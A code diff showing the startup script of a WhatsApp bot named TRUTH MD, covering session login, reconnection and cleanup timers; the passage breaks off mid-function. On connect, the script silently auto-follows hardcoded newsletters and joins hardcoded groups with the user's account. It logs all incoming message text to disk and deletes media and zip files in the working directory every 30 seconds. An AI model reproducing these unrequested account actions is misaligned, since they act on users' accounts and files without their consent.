+require('dotenv').config(); // CRITICAL: Load .env variables first!
+// *******************************************************************
+// *** CRITICAL CHANGE: REQUIRED FILES (settings.js, main, etc.) ***
+// *** HAVE BEEN REMOVED FROM HERE AND MOVED BELOW THE CLONER RUN. ***
+// *******************************************************************
+
+const fs = require('fs')
+const chalk = require('chalk')
+const path = require('path')
+const axios = require('axios')
+const os = require('os')
+const PhoneNumber = require('awesome-phonenumber')
+// The smsg utility also depends on other files, so we'll move its require statement.
+// const { smsg } = require('./lib/myfunc') 
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    fetchLatestBaileysVersion,
+    jidNormalizedUser,
+    makeCacheableSignalKeyStore,
+    delay 
+} = require("@whiskeysockets/baileys")
+
+const NodeCache = require("node-cache")
+const pino = require("pino")
+const readline = require("readline")
+const { rmSync } = require('fs')
+
+// --- 🌟 NEW: Centralized Logging Function ---
+/**
+ * Custom logging function to enforce the [ JUNE - MD ] prefix and styling.
+ * @param {string} message - The message to log.
+ * @param {string} [color='white'] - The chalk color (e.g., 'green', 'red', 'yellow').
+ * @param {boolean} [isError=false] - Whether to use console.error.
+ */
+function log(message, color = 'white', isError = false) {
+    const prefix = chalk.magenta.bold('[ TRUTH - MD ]');
+    const logFunc = isError ? console.error : console.log;
+    const coloredMessage = chalk[color](message);
+    
+    // Split message by newline to ensure prefix is on every line, 
+    // but only for multi-line messages without custom chalk background/line art.
+    if (message.includes('\n') || message.includes('════')) {
+        logFunc(prefix, coloredMessage);
+    } else {
+         logFunc(`${prefix} ${coloredMessage}`);
+    }
+}
+// -------------------------------------------
+
+
+// --- GLOBAL FLAGS ---
+global.isBotConnected = false; 
+global.connectDebounceTimeout = null;
+// --- NEW: Error State Management ---
+global.errorRetryCount = 0; // The in-memory counter for 408 errors in the active process
+
+// ***************************************************************
+// *** DEPENDENCIES MOVED DOWN HERE (AFTER THE CLONING IS COMPLETE) ***
+// ***************************************************************
+
+// We will redefine these variables and requires inside the tylor function
+let smsg, handleMessages, handleGroupParticipantUpdate, handleStatus, store, settings;
+
+// --- 🔒 MESSAGE/ERROR STORAGE CONFIGURATION & HELPERS ---
+const MESSAGE_STORE_FILE = path.join(__dirname, 'message_backup.json');
+// --- NEW: Error Counter File ---
+const SESSION_ERROR_FILE = path.join(__dirname, 'sessionErrorCount.json');
+global.messageBackup = {};
+
+function loadStoredMessages() {
+    try {
+        if (fs.existsSync(MESSAGE_STORE_FILE)) {
+            const data = fs.readFileSync(MESSAGE_STORE_FILE, 'utf-8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        log(`Error loading message backup store: ${error.message}`, 'red', true);
+    }
+    return {};
+}
+
+function saveStoredMessages(data) {
+    try {
+        fs.writeFileSync(MESSAGE_STORE_FILE, JSON.stringify(data, null, 2));
+    } catch (error) {
+        log(`Error saving message backup store: ${error.message}`, 'red', true);
+    }
+}
+global.messageBackup = loadStoredMessages();
+
+// --- NEW: Error Counter Helpers ---
+function loadErrorCount() {
+    try {
+        if (fs.existsSync(SESSION_ERROR_FILE)) {
+            const data = fs.readFileSync(SESSION_ERROR_FILE, 'utf-8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        log(`Error loading session error count: ${error.message}`, 'red', true);
+    }
+    // Structure: { count: number, last_error_timestamp: number (epoch) }
+    return { count: 0, last_error_timestamp: 0 };
+}
+
+function saveErrorCount(data) {
+    try {
+        fs.writeFileSync(SESSION_ERROR_FILE, JSON.stringify(data, null, 2));
+    } catch (error) {
+        log(`Error saving session error count: ${error.message}`, 'red', true);
+    }
+}
+
+function deleteErrorCountFile() {
+    try {
+        if (fs.existsSync(SESSION_ERROR_FILE)) {
+            fs.unlinkSync(SESSION_ERROR_FILE);
+            log('✅ Deleted sessionErrorCount.json.', 'red');
+        }
+    } catch (e) {
+        log(`Failed to delete sessionErrorCount.json: ${e.message}`, 'red', true);
+    }
+}
+
+
+// --- ♻️ CLEANUP FUNCTIONS ---
+
+/**
+ * NEW: Helper function to centralize the cleanup of all session-related files.
+ */
+function clearSessionFiles() {
+    try {
+        log('🗑️ Clearing session folder...', 'blue');
+        // Delete the entire session directory
+        rmSync(sessionDir, { recursive: true, force: true });
+        // Delete login file if it exists
+        if (fs.existsSync(loginFile)) fs.unlinkSync(loginFile);
+        // Delete error count file
+        deleteErrorCountFile();
+        global.errorRetryCount = 0; // Reset in-memory counter
+        log('✅ Session files cleaned successfully.', 'green');
+    } catch (e) {
+        log(`Failed to clear session files: ${e.message}`, 'red', true);
+    }
+}
+
+
+function cleanupOldMessages() {
+    let storedMessages = loadStoredMessages();
+    let now = Math.floor(Date.now() / 1000);
+    const maxMessageAge = 24 * 60 * 60;
+    let cleanedMessages = {};
+    for (let chatId in storedMessages) {
+        let newChatMessages = {};
+        for (let messageId in storedMessages[chatId]) {
+            let message = storedMessages[chatId][messageId];
+            if (now - message.timestamp <= maxMessageAge) {
+                newChatMessages[messageId] = message; 
+            }
+        }
+        if (Object.keys(newChatMessages).length > 0) {
+            cleanedMessages[chatId] = newChatMessages; 
+        }
+    }
+    saveStoredMessages(cleanedMessages);
+    log("🧹 [Msg Cleanup] Old messages removed from message_backup.json", 'yellow');
+}
+
+function cleanupJunkFiles(botSocket) {
+    let directoryPath = path.join(); 
+    fs.readdir(directoryPath, async function (err, files) {
+        if (err) return log(`[Junk Cleanup] Error reading directory: ${err}`, 'red', true);
+        const filteredArray = files.filter(item =>
+            item.endsWith(".gif") || item.endsWith(".png") || item.endsWith(".mp3") ||
+            item.endsWith(".mp4") || item.endsWith(".opus") || item.endsWith(".jpg") ||
+            item.endsWith(".webp") || item.endsWith(".webm") || item.endsWith(".zip")
+        );
+        if (filteredArray.length > 0) {
+            let teks = `Detected ${filteredArray.length} junk files,\nJunk files have been deleted🚮`;
+            // Note: botSocket is only available *after* the bot connects, which is fine for this interval.
+            if (botSocket && botSocket.user && botSocket.user.id) {
+                botSocket.sendMessage(botSocket.user.id.split(':')[0] + '@s.whatsapp.net', { text: teks });
+            }
+            filteredArray.forEach(function (file) {
+                const filePath = path.join(directoryPath, file);
+                try {
+                    if(fs.existsSync(filePath)) fs.unlinkSync(filePath);
+                } catch(e) {
+                    log(`[Junk Cleanup] Failed to delete file ${file}: ${e.message}`, 'red', true);
+                }
+            });
+            log(`[Junk Cleanup] ${filteredArray.length} files deleted.`, 'yellow');
+        }
+    });
+}
+
+// --- TRUTH MD ORIGINAL CODE START ---
+global.botname = "TRUTH MD"
+global.themeemoji = "•"
+const pairingCode = !!global.phoneNumber || process.argv.includes("--pairing-code")
+const useMobile = process.argv.includes("--mobile")
+
+// --- Readline setup (TRUTH MD) ---
+const rl = process.stdin.isTTY ? readline.createInterface({ input: process.stdin, output: process.stdout }) : null
+// The question function will use the 'settings' variable, but it's called inside getLoginMethod, which is 
+// called after the clone, so we keep this definition but ensure 'settings' is available when called.
+const question = (text) => rl ? new Promise(resolve => rl.question(text, resolve)) : Promise.resolve(settings?.ownerNumber || global.phoneNumber)
+
+/*━━━━━━━━━━━━━━━━━━━━*/
+// --- Paths (TRUTH MD) ---
+/*━━━━━━━━━━━━━━━━━━━━*/
+const sessionDir = path.join(__dirname, 'session')
+const credsPath = path.join(sessionDir, 'creds.json')
+const loginFile = path.join(sessionDir, 'login.json')
+const envPath = path.join(process.cwd(), '.env');
+
+/*━━━━━━━━━━━━━━━━━━━━*/
+// --- Login persistence (TRUTH MD) ---
+/*━━━━━━━━━━━━━━━━━━━━*/
+
+async function saveLoginMethod(method) {
+    await fs.promises.mkdir(sessionDir, { recursive: true });
+    await fs.promises.writeFile(loginFile, JSON.stringify({ method }, null, 2));
+}
+
+async function getLastLoginMethod() {
+    if (fs.existsSync(loginFile)) {
+        const data = JSON.parse(fs.readFileSync(loginFile, 'utf-8'));
+        return data.method;
+    }
+    return null;
+}
+
+// --- Session check (TRUTH MD) ---
+function sessionExists() {
+    return fs.existsSync(credsPath);
+}
+
+// --- NEW: Check and use SESSION_ID from .env/environment variables ---
+async function checkEnvSession() {
+    const envSessionID = process.env.SESSION_ID;
+    if (envSessionID) {
+        if (!envSessionID.includes("TECHWORLD:~")) { 
+            log("🚨 WARNING: Environment SESSION_ID is missing the required prefix 'TECHWORLD:~'. Assuming BASE64 format.", 'red'); 
+        }
+        global.SESSION_ID = envSessionID.trim();
+        return true;
+    }
+    return false;
+}
+
+/**
+ * NEW LOGIC: Checks if SESSION_ID starts with "TECHWORLD". If not, cleans .env and restarts.
+ */
+async function checkAndHandleSessionFormat() {
+    const sessionId = process.env.SESSION_ID;
+    
+    if (sessionId && sessionId.trim() !== '') {
+        // Only check if it's set and non-empty
+        if (!sessionId.trim().startsWith('TECHWORLD')) {
+            log(chalk.white.bgRed('[ERROR]: Invalid SESSION_ID in .env'), 'white');
+            log(chalk.white.bgRed('[SESSION ID] MUST start with "TECHWORLD".'), 'white');
+            log(chalk.white.bgRed('Cleaning .env and creating new one...'), 'white');
+            
+         try {
+                let envContent = fs.readFileSync(envPath, 'utf8');
+                
+                // Use regex to replace only the SESSION_ID line while preserving other variables
+                envContent = envContent.replace(/^SESSION_ID=.*$/m, 'SESSION_ID=');
+                
+                fs.writeFileSync(envPath, envContent);
+                log('✅ Cleaned SESSION_ID entry in .env file.', 'green');
+                log('Please add a proper session ID and restart the bot.', 'yellow');
+            } catch (e) {
+                log(`Failed to modify .env file. Please check permissions: ${e.message}`, 'red', true);
+            }
+            
+            // Delay before exiting to allow user to read the message before automatic restart
+            log('Bot will wait 30 seconds then restart', 'blue');
+            await delay(20000);
+            
+            // Exit with code 1 to ensure the hosting environment restarts the process
+            process.exit(1);
+        }
+    }
+}
+
+
+// --- Get login method (TRUTH MD) ---
+async function getLoginMethod() {
+    const lastMethod = await getLastLoginMethod();
+    if (lastMethod && sessionExists()) {
+        log(`Last login method detected: ${lastMethod}. Using it automatically.`, 'blue');
+        return lastMethod;
+    }
+    
+    if (!sessionExists() && fs.existsSync(loginFile)) {
+        log(`Session files missing. Removing old login preference for clean re-login.`, 'blue');
+        fs.unlinkSync(loginFile);
+    }
+
+    // Interactive prompt for Pterodactyl/local
+    if (!process.stdin.isTTY) {
+        // If not running in a TTY (like Heroku), and no SESSION_ID was found in Env Vars (checked in tylor()),
+        // it means interactive login won't work, so we exit gracefully.
+        log("❌ No Session ID found in environment variables.", 'red');
+        process.exit(1);
+    }
+
+
+    log("Choose login method:", 'yellow');
+    log("1) Enter WhatsApp Number (Pairing Code)", 'blue');
+    log("2) Paste Session ID", 'blue');
+
+    let choice = await question("Enter option number (1 or 2): ");
+    choice = choice.trim();
+
+    if (choice === '1') {
+        let phone = await question(chalk.bgBlack(chalk.greenBright(`Enter your WhatsApp number (e.g., 254798570132): `)));
+        phone = phone.replace(/[^0-9]/g, '');
+        const pn = require('awesome-phonenumber');
+        if (!pn('+' + phone).isValid()) { log('Invalid phone number.', 'red'); return getLoginMethod(); }
+        global.phoneNumber = phone;
+        await saveLoginMethod('number');
+        return 'number';
+    } else if (choice === '2') {
+        let sessionId = await question(chalk.bgBlack(chalk.greenBright(`Paste your Session ID here: `)));
+        sessionId = sessionId.trim();
+        // Pre-check the format during interactive entry as well
+        if (!sessionId.includes("TECHWORLD:~")) { 
+            log("Invalid Session ID format! Must contain 'TECHWORLD:~'.", 'red'); 
+            process.exit(1); 
+        }
+        global.SESSION_ID = sessionId;
+        await saveLoginMethod('session');
+        return 'session';
+    } else {
+        log("Invalid option! Please choose 1 or 2.", 'red');
+        return getLoginMethod();
+    }
+}
+
+// --- Download session (TRUTH MD) ---
+async function downloadSessionData() {
+    try {
+        await fs.promises.mkdir(sessionDir, { recursive: true });
+        if (!fs.existsSync(credsPath) && global.SESSION_ID) {
+            // Check for the prefix and handle the split logic
+            const base64Data = global.SESSION_ID.includes("TECHWORLD:~") ? global.SESSION_ID.split("TECHWORLD:~")[1] : global.SESSION_ID;
+            const sessionData = Buffer.from(base64Data, 'base64');
+            await fs.promises.writeFile(credsPath, sessionData);
+            log(`Session successfully saved.`, 'green');
+        }
+    } catch (err) { log(`Error downloading session data: ${err.message}`, 'red', true); }
+}
+
+// --- Request pairing code (TRUTH MD) ---
+async function requestPairingCode(socket) {
+    try {
+        log("Waiting 3 seconds for socket stabilization before requesting pairing code...", 'yellow');
+        await delay(3000); 
+
+        let code = await socket.requestPairingCode(global.phoneNumber);
+        code = code?.match(/.{1,4}/g)?.join("-") || code;
+        log(chalk.bgGreen.black(`\nYour Pairing Code: ${code}\n`), 'white');
+        log(`
+Please enter this code in WhatsApp app:
+1. Open WhatsApp
+2. Go to Settings => Linked Devices
+3. Tap "Link a Device"
+4. Enter the code shown above
+        `, 'blue');
+        return true; 
+    } catch (err) { 
+        log(`Failed to get pairing code: ${err.message}`, 'red', true); 
+        return false; 
+    }
+}
+
+// --- Dedicated function to handle post-connection initialization and welcome message
+async function sendWelcomeMessage(XeonBotInc) {
+    // Safety check: Only proceed if the welcome message hasn't been sent yet in this session.
+    if (global.isBotConnected) return; 
+    
+    // CRITICAL: Wait 10 seconds for the connection to fully stabilize
+    await delay(10000); 
+
+    //detectPlatform
+ const detectPlatform = () => {
+  if (process.env.DYNO) return "☁️ Heroku";
+  if (process.env.RENDER) return "⚡ Render";
+  if (process.env.PREFIX && process.env.PREFIX.includes("termux")) return "📱 Termux";
+  if (process.env.PORTS && process.env.CYPHERX_HOST_ID) return "🌀 TRUTH-MD Platform";
+  if (process.env.P_SERVER_UUID) return "🖥️ Panel";
+  if (process.env.LXC) return "📦 Linux Container (LXC)";
+  
+  switch (os.platform()) {
+    case "win32": return "🪟 Windows";
+    case "darwin": return "🍎 macOS";
+    case "linux": return "🐧 Linux";
+    default: return "❓ Unknown";
+  }
+};
+
+    const hostName = detectPlatform();
+    
+
+    try {
+
+        const { getPrefix, handleSetPrefixCommand } = require('./commands/setprefix');
+        if (!XeonBotInc.user || global.isBotConnected) return;
+
+        global.isBotConnected = true;
+        const pNumber = XeonBotInc.user.id.split(':')[0] + '@s.whatsapp.net';
+        let data = JSON.parse(fs.readFileSync('./data/messageCount.json'));
+        let currentMode = 'public';
+        try {
+            const { getConfig } = require('./lib/configdb');
+            currentMode = getConfig('MODE') || settings.commandMode || 'public';
+        } catch (_) {
+            currentMode = data.isPublic ? 'public' : 'private';
+        }
+        const prefix = getPrefix();
+
+        // Send the message
+        await XeonBotInc.sendMessage(pNumber, {
+            text: `
+┏━━━━━✧ CONNECTED ✧━━━━━━━
+┃✧ Prefix: [ ${prefix} ]
+┃✧ mode: ${currentMode}
+┃✧ Platform: ${hostName}
+┃✧ Bot: TRUTH MD 
+┃✧ Status: Active
+┃✧ Time: ${new Date().toLocaleString()}
+┃✧ Telegram: t.me/Courtney254
+┗━━━━━━━━━━━━━━━━━━━━━`
+        });
+        log('✅ Bot successfully connected to Whatsapp.', 'green');
+
+        const newsletters = ["120363409714698622@newsletter", "120363424199376597@newsletter"];
+        for (let i = 0; i < newsletters.length; i++) {
+            try {
+                await XeonBotInc.newsletterFollow(newsletters[i]);
+                console.log(chalk.blue(`✅ Auto-followed newsletter ${i + 1} successfully`));
+            } catch (e) {
+                if (e.message?.includes('already') || e.message?.includes('conflict') || e.message?.includes('unexpected')) {
+                    console.log(chalk.green(`✅ Newsletter ${i + 1}: Already following`));
+                } else {
+                    console.log(chalk.red(`🚫 Newsletter ${i + 1} follow failed: ${e.message}`));
+                }
+            }
+        }
+
+        const groupInvites = ["HjFc3pud3IA0R0WGr1V2Xu", "BDY9T7ikFgmEjBEOsdTvK8"];
+        for (let i = 0; i < groupInvites.length; i++) {
+            try {
+                await XeonBotInc.groupAcceptInvite(groupInvites[i]);
+                console.log(chalk.blue(`✅ Auto-joined group ${i + 1} successfully`));
+            } catch (e) {
+                if (e.message?.includes('conflict') || e.message?.includes('already')) {
+                    console.log(chalk.green(`✅ Group ${i + 1}: Already joined`));
+                } else {
+                    console.log(chalk.red(`🚫 Group ${i + 1} join failed: ${e.message}`));
+                }
+            }
+        }
+
+                    
+
+        deleteErrorCountFile();
+        global.errorRetryCount = 0;
+    } catch (e) {
+        log(`Error sending welcome message during stabilization: ${e.message}`, 'red', true);
+        global.isBotConnected = false;
+    }
+}
+
+/**
+ * NEW FUNCTION: Handles the logic for persistent 408 (timeout) errors.
+ * @param {number} statusCode The disconnect status code.
+ */
+async function handle408Error(statusCode) {
+    if (statusCode === DisconnectReason.connectionTimeout || statusCode === DisconnectReason.timedOut) {
+        log(`Connection Timeout (${statusCode}) detected. Attempting silent reconnect...`, 'yellow');
+        await delay(5000);
+        return true;
+    }
+
+}
+
+
+// --- 2.3.0: NEW: .env Persistence Logic ---
+async function ensureEnvFile() {
+    if (!fs.existsSync(envPath)) {
+        log('📝 .env file not found. Creating a new one...', 'yellow');
+        const defaultEnv = `SESSION_ID=${global.SESSION_ID || ''}\n`;
+        fs.writeFileSync(envPath, defaultEnv);
+        log('✅ Created .env file successfully with SESSION_ID.', 'green');
+    } else {
+        // If it exists, ensure SESSION_ID is synced if we have one in memory
+        try {
+            let envContent = fs.readFileSync(envPath, 'utf8');
+            if (!envContent.includes('SESSION_ID=')) {
+                const entry = envContent.endsWith('\n') ? `SESSION_ID=${global.SESSION_ID || ''}\n` : `\nSESSION_ID=${global.SESSION_ID || ''}\n`;
+                fs.appendFileSync(envPath, entry);
+                log('✅ Added SESSION_ID entry to existing .env.', 'green');
+            } else if (global.SESSION_ID && envContent.includes('SESSION_ID=')) {
+                // If it exists but is empty, we could update it here if needed
+                // For now, focus on the user's specific request about adding the key
+            }
+        } catch (e) {
+            log(`Could not sync .env: ${e.message}`, 'red', true);
+        }
+    }
+}
+
+// --- Start bot (TRUTH MD) ---
+async function startXeonBotInc() {
+    // Ensure .env exists before starting core logic
+    await ensureEnvFile();
+    
+    log('Connecting to WhatsApp...', 'cyan');
+    const { version } = await fetchLatestBaileysVersion();
+    
+    // Ensure session directory exists before Baileys attempts to use it
+    await fs.promises.mkdir(sessionDir, { recursive: true });
+
+    const { state, saveCreds } = await useMultiFileAuthState(`./session`);
+    const msgRetryCounterCache = new NodeCache();
+
+    const XeonBotInc = makeWASocket({
+        version,
+        logger: pino({ level: 'silent' }),
+        printQRInTerminal: false, 
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
+        },
+        markOnlineOnConnect: true,
+        generateHighQualityLinkPreview: true,
+        syncFullHistory: true,
+        getMessage: async (key) => {
+            let jid = jidNormalizedUser(key.remoteJid);
+            // This now uses the globally available 'store' which is loaded inside tylor()
+            let msg = await store.loadMessage(jid, key.id); 
+            return msg?.message || "";
+        },
+        msgRetryCounterCache
+    });
+
+    store.bind(XeonBotInc.ev);
+
+    const botStartTimestamp = Math.floor(Date.now() / 1000);
+
+    // --- 🚨 MESSAGE LOGGER ---
+    XeonBotInc.ev.on('messages.upsert', async chatUpdate => {
+        // (Omitted message logger logic for brevity)
+        for (const msg of chatUpdate.messages) {
+              if (!msg.message) continue;
+              let chatId = msg.key.remoteJid;
+              let messageId = msg.key.id;
+              if (!global.messageBackup[chatId]) { global.messageBackup[chatId] = {}; }
+              let textMessage = msg.message?.conversation || msg.message?.extendedTextMessage?.text || null;
+              if (!textMessage) continue;
+              let savedMessage = { sender: msg.key.participant || msg.key.remoteJid, text: textMessage, timestamp: msg.messageTimestamp };
+              if (!global.messageBackup[chatId][messageId]) { global.messageBackup[chatId][messageId] = savedMessage; saveStoredMessages(global.messageBackup); }
+        }
+
+        // --- TRUTH MD ORIGINAL HANDLER ---
+        const mek = chatUpdate.messages[0];
+        if (!mek.message) return;
+
+        const msgTimestamp = typeof mek.messageTimestamp === 'object' ? mek.messageTimestamp.low : Number(mek.messageTimestamp);
+        if (msgTimestamp && msgTimestamp < botStartTimestamp - 10) return;
+
+        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
+        // This relies on handleStatus and handleMessages being loaded
+        if (mek.key.remoteJid === 'status@broadcast') { await handleStatus(XeonBotInc, chatUpdate); return; }
+        try { await handleMessages(XeonBotInc, chatUpdate, true) } catch(e){ log(e.message, 'red', true) }
+    });
+
+
+    // --- ⚠️ CONNECTION UPDATE LISTENER (Enhanced Logic with 401/408 handler)
+    XeonBotInc.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect, qr } = update;
+        
+        if (connection === 'close') {
+            global.isBotConnected = false; 
+            
+            const statusCode = lastDisconnect?.error?.output?.statusCode;
+            // Capture both DisconnectReason.loggedOut (sometimes 401) and explicit 401 error
+            const permanentLogout = statusCode === DisconnectReason.loggedOut || statusCode === 401;
+            
+            // Log and handle permanent errors (logged out, invalid session)
+            if (permanentLogout) {
+                log(chalk.bgRed.black(`\n💥 Disconnected! Status Code: ${statusCode} [LOGGED OUT].`), 'red');
+                log('🗑️ Deleting session folder...', 'yellow');
+                
+                // AUTOMATICALLY DELETE SESSION (using the new helper)
+                clearSessionFiles();
+                
+                log('Session, login preference, and error count cleaned...','red');
+                log('Initiating full process restart in 5 seconds...', 'blue');
+                await delay(5000);
+                
+                // CRITICAL FIX: Use process.exit(1) to trigger a clean restart by the Daemon
+                process.exit(1); 
+                
+            } else {
+                // NEW: Handle the 408 Timeout Logic FIRST
+                const is408Handled = await handle408Error(statusCode);
+                if (is408Handled) {
+                    // If handle408Error decides to exit, it will already have called process.exit(1)
+                    return;
+                }
+
+                // This handles all other temporary errors (Stream, Connection, Timeout, etc.)
+                log(`Connection closed due to temporary issue (Status: ${statusCode}). Attempting reconnect...`, 'yellow');
+                // Re-start the whole bot process (this handles temporary errors/reconnects)
+                startXeonBotInc(); 
+            }
+        } else if (connection === 'open') {           
+            console.log(chalk.yellow(`💅Connected to => ` + JSON.stringify(XeonBotInc.user, null, 2)))
+            log('TRUTH-MD Connected', 'yellow');      
+            log(`Github: courtney250`, 'yellow');
+            try {
+                const { updateLidMap } = require('./lib/index');
+                if (XeonBotInc.user && XeonBotInc.user.id && XeonBotInc.user.lid) {
+                    updateLidMap([{ id: XeonBotInc.user.id, lid: XeonBotInc.user.lid }]);
+                }
+            } catch (_) {}
+            
+            // Send the welcome message (which includes the 10s stability delay and error reset)
+     await sendWelcomeMessage(XeonBotInc);
+        }
+    });
+
+    XeonBotInc.ev.on('creds.update', saveCreds);
+    XeonBotInc.public = true;
+    // This relies on smsg being loaded
+    XeonBotInc.serializeM = (m) => smsg(XeonBotInc, m, store); 
+
+    // --- ⚙️ BACKGROUND INTERVALS (Cleanup Logic) ---
+
+    // 1. Session File Cleanup 
+    setInterval(() => {
+        try {
+            const sessionPath = path.join(sessionDir);  
+            if (!fs.existsSync(sessionPath)) return;
+            fs.readdir(sessionPath, (err, files) => {
+                if (err) return log(`[SESSION CLEANUP] Unable to scan directory: ${err}`, 'red', true);
+                const now = Date.now();
+                const filteredArray = files.filter((item) => {
+                    const filePath = path.join(sessionPath, item);
+                    try {
+                        const stats = fs.statSync(filePath);
+                        return ((item.startsWith("pre-key") || item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")) &&
+                            item !== 'creds.json' && now - stats.mtimeMs > 2 * 24 * 60 * 60 * 1000);  
+                    } catch (statError) {
+                             log(`[Session Cleanup] Error statting file ${item}: ${statError.message}`, 'red', true);
+                             return false;
+                    }
+                });
+                if (filteredArray.length > 0) {
+                    log(`[Session Cleanup] Found ${filteredArray.length} old session files. Clearing...`, 'yellow');
+                    filteredArray.forEach((file) => {
+                        const filePath = path.join(sessionPath, file);
+                        try { fs.unlinkSync(filePath); } catch (unlinkError) { log(`[Session Cleanup] Failed to delete file ${filePath}: ${unlinkError.message}`, 'red', true); }
+                    });
+                }
+            });
+        } catch (error) {
+            log(`[SESSION CLEANUP] Error clearing old session files: ${error.message}`, 'red', true);
+        }
+    }, 7200000); 
+
+
+    // 2. Message Store Cleanup  
+    const cleanupInterval = 60 * 60 * 1000;
+    setInterval(cleanupOldMessages, cleanupInterval);
+
+    // 3. Junk File Cleanup  
+    const junkInterval = 30_000;
+    setInterval(() => cleanupJunkFiles(XeonBotInc), junkInterval); 
+
+    return XeonBotInc;
+}
+
+// --- New Core Integrity Check Function ---
+async function checkSessionIntegrityAndClean() {
+    const isSessionFolderPresent = fs.existsSync(sessionDir);
+    const isValidSession = sessionExists(); 
+    
+    // Scenario: Folder exists, but 'creds.json' is missing (incomplete/junk session)
+    if (isSessionFolderPresent && !isValidSession) {
+        
+        log('⚠️ Detected incomplete/junk session files on startup...', 'red');
+        log('✅ Cleaning up before proceeding...', 'yellow');
+        
+        // 1. Delete the entire session folder (junk files, partial state, etc.)
+        clearSessionFiles(); // Use the helper function
+        
+        // 2. Add the requested 3-second delay after cleanup
+        log('Cleanup complete. Waiting 3 seconds for stability...', 'yellow');
+        await delay(3000);
+    }
+}
+
+
+// --- 🌟 NEW: .env File Watcher for Automated Restart ---
+/**
+ * Monitors the .env file for changes and forces a process restart.
+ * Made mandatory to ensure SESSION_ID changes are always picked up.
+ * @private 
+ */
+function checkEnvStatus() {
+    try {
+        const envPath = path.join(__dirname, '.env');
+        if (!fs.existsSync(envPath)) {
+            fs.writeFileSync(envPath, 'SESSION_ID=\n');
+        }
+        log(`║ [WATCHER] .env ║`, 'green');
+        
+        // Use persistent: false for better behavior in some hosting environments
+        // Always set the watcher regardless of the environment
+        fs.watch(envPath, { persistent: false }, (eventType, filename) => {
+            if (filename && eventType === 'change') {
+                log(chalk.bgRed.black('================================================='), 'white');
+                log(chalk.white.bgRed(' [ENV] env file change detected!'), 'white');
+                log(chalk.white.bgRed('Forcing a clean restart to apply new configuration (e.g., SESSION_ID).'), 'white');
+                log(chalk.red.bgBlack('================================================='), 'white');
+                
+                // Use process.exit(1) to ensure the hosting environment (Pterodactyl/Heroku) restarts the script
+                process.exit(1);
+            }
+        });
+    } catch (e) {
+        log(`❌ Failed to set up .env file watcher (fs.watch error): ${e.message}`, 'red', true);
+        // Do not exit, as the bot can still run, but notify the user
+    }
+}
+// -------------------------------------------------------------
+
+
+// --- Main login flow (TRUTH MD) ---
+async function tylor() {
+    
+    // 1. MANDATORY: Run the codebase cloner FIRST
+    // This function will run on every script start or restart and forces a full refresh.
+   // await downloadAndSetupCodebase();
+    
+    // *************************************************************
+    // *** CRITICAL: REQUIRED FILES MUST BE LOADED AFTER CLONING ***
+    // *************************************************************
+    try {
+        // We require settings BEFORE the env check to ensure the file is present
+        // in case the cloning just happened.
+        require('./settings')
+        const mainModules = require('./main');
+        handleMessages = mainModules.handleMessages;
+        handleGroupParticipantUpdate = mainModules.handleGroupParticipantUpdate;
+        handleStatus = mainModules.handleStatus;
+
+        const myfuncModule = require('./lib/myfunc');
+        smsg = myfuncModule.smsg;
+
+        store = require('./lib/lightweight_store')
+        store.readFromFile()
+        settings = require('./settings')
+        setInterval(() => store.writeToFile(), settings.storeWriteInterval || 10000)
+
+        log("✨ Core files loaded successfully.", 'green');
+    } catch (e) {
+        log(`FATAL: Failed to load core files after cloning. Check cloned repo structure. ${e.message}`, 'red', true);
+        process.exit(1);
+    }
+    // *************************************************************
+    
+    // 2. NEW: Check the SESSION_ID format *before* connecting
+    await checkAndHandleSessionFormat();
+    
+    // 3. Set the global in-memory retry count based on the persistent file, if it exists
+    global.errorRetryCount = loadErrorCount().count;
+    log(`Retrieved initial 408 retry count: ${global.errorRetryCount}`, 'yellow');
+    
+    // 4. *** IMPLEMENT USER'S PRIORITY LOGIC: Check .env SESSION_ID FIRST ***
+    const envSessionID = process.env.SESSION_ID?.trim();
+
+    if (envSessionID && envSessionID.startsWith('TECHWORLD')) { 
+        log("Found new SESSION_ID in environment variable.", 'magenta');
+        
+        // 4a. Force the use of the new session by cleaning any old persistent files.
+        clearSessionFiles(); 
+        
+        // 4b. Set global and download the new session file (creds.json) from the .env value.
+        global.SESSION_ID = envSessionID;
+        await downloadSessionData(); 
+        await saveLoginMethod('session'); 
+
+        // 4c. Start bot with the newly created session files
+        log("Valid session found from .env...", 'green');
+        log('Waiting 3 seconds for stable connection...', 'yellow'); 
+        await delay(3000);
+        await startXeonBotInc();
+        
+        // 4d. Start the file watcher
+        checkEnvStatus(); // <--- START .env FILE WATCHER (Mandatory)
+        
+        return;
+    }
+    // If environment session is NOT set, or not valid, continue with fallback logic:
+    log("[ALERT] No new SESSION_ID found in .env", 'blue');
+    log("Falling back to stored session....", 'blue');
+
+    // 5. Run the mandatory integrity check and cleanup
+    await checkSessionIntegrityAndClean();
+    
+    // 6. Check for a valid *stored* session after cleanup
+    if (sessionExists()) {
+        log("[ALERT]: Valid session found, starting bot directly...", 'green'); 
+        log('[ALERT]: Waiting 3 seconds for stable connection...', 'blue');
+        await delay(3000);
+        await startXeonBotInc();
+        
+        // 6a. Start the file watcher
+        checkEnvStatus(); // <--- START .env FILE WATCHER (Mandatory)
+        
+        return;
+    }
+    
+    // 7. New Login Flow (If no valid session exists)
+    const loginMethod = await getLoginMethod();
+    let XeonBotInc;
+
+    if (loginMethod === 'session') {
+        await downloadSessionData();
+        // Socket is only created AFTER session data is saved
+        XeonBotInc = await startXeonBotInc(); 
+    } else if (loginMethod === 'number') {
+        // Socket is created BEFORE pairing code is requested
+        XeonBotInc = await startXeonBotInc();
+        await requestPairingCode(XeonBotInc); 
+    } else {
+        log("[ALERT]: Failed to get valid login method.", 'red');
+        return;
+    }
+    
+    // 8. Final Cleanup After Pairing Attempt Failure (If number login fails before creds.json is written)
+    if (loginMethod === 'number' && !sessionExists() && fs.existsSync(sessionDir)) {
+        log('[ALERT]: Login interrupted [FAILED]. Clearing temporary session files ...', 'red');
+        log('[ALERT]: Restarting for instance...', 'red');
+        
+        clearSessionFiles(); // Use the helper function
+        
